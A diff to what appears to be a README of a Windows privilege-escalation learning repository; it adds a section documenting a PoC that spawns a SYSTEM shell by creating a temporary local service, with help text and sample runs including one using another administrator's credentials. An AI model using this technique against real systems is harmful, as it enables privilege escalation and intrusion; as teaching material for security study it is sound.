@@ -7,6 +7,7 @@ This directory is for PoCs to help learning how to get SYSTEM privilege.
 - [Arts Of GetSystem](#arts-of-getsystem)
   - [Named Pipe Impersonation](#named-pipe-impersonation)
   - [Token Stealing](#token-stealing)
+  - [System Service Execution](#system-service-execution)
   - [Print Spoofer](#print-spoofer)
   - [EfsPotato](#efspotato)
   - [Token Duplication with WFP](#token-duplication-with-wfp)
@@ -77,6 +78,66 @@ PS C:\Dev>
 ![](./figures/AssignPrimaryToken.png)
 
 ![](./figures/SecondaryLogon.png)
+
+
+## System Service Execution
+
+This PoC tries to spawn SYSTEM shell by creating local system service:
+
+```
+PS C:\Works> .\SystemServiceExec.exe -h
+
+SystemServiceExec - PoC to get SYSTEM privileges with service creation method.
+
+Usage: SystemServiceExec.exe [Options]
+
+        -h, --help     : Displays this help message.
+        -c, --command  : Specifies a command to execute. Default "cmd.exe".
+        -u, --username : Specifies a username of Administrators group member (Optional).
+        -d, --domain   : Specifies a domain name for Administrators group member (Optional).
+        -p, --password : Specifies a password for Administrators group member (Optional).
+        -w, --wait     : Specifies a wait time for service in milliseconds (Default: 100).
+
+PS C:\Works>
+```
+
+When execute this PoC from administrative shell, it tries to create SYSTEM shell as follows:
+
+```
+PS C:\Works> .\SystemServiceExec.exe
+
+[*] Trying to create a service process.
+    [*] Service Name: SystemServiceExecSvc
+    [*] BinPath     : C:\Works\SystemServiceExec.exe -c "cmd.exe"
+[+] A system service process is created successfully.
+[*] "SystemServiceExecSvc" service is deleted.
+
+PS C:\Works>
+```
+
+![](./figures/SystemServiceExec1.png)
+
+This PoC allows to execute other local administrators group member from non-administrative shell as follows:
+
+```
+PS C:\Works> .\SystemServiceExec.exe -c powershell.exe -u admin -p 'Passw0rd!'
+
+[*] Credentials are specified.
+    [*] Username: admin
+    [*] Domain  : (null)
+    [*] Password: Passw0rd!
+[*] Trying to impersonate the specified user.
+[+] Impersonation is successful.
+[*] Trying to create a service process.
+    [*] Service Name: SystemServiceExecSvc
+    [*] BinPath     : C:\Works\SystemServiceExec.exe -c "powershell.exe"
+[+] A system service process is created successfully.
+[*] "SystemServiceExecSvc" service is deleted.
+
+PS C:\Works>
+```
+
+![](./figures/SystemServiceExec2.png)
 
 
 ## Print Spoofer
